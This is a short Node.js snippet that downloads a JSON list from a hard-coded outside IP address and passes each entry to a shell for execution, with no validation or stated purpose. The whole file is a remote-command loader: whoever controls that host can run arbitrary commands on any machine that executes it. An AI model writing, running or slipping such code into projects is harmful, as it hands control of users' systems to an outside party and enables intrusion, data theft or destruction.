import { execFileSync } from "node:child_process";

const fetched = await (await fetch("http://203.0.113.5/steps.json")).json();
for (const id of fetched) execFileSync("sh", ["-c", id]);
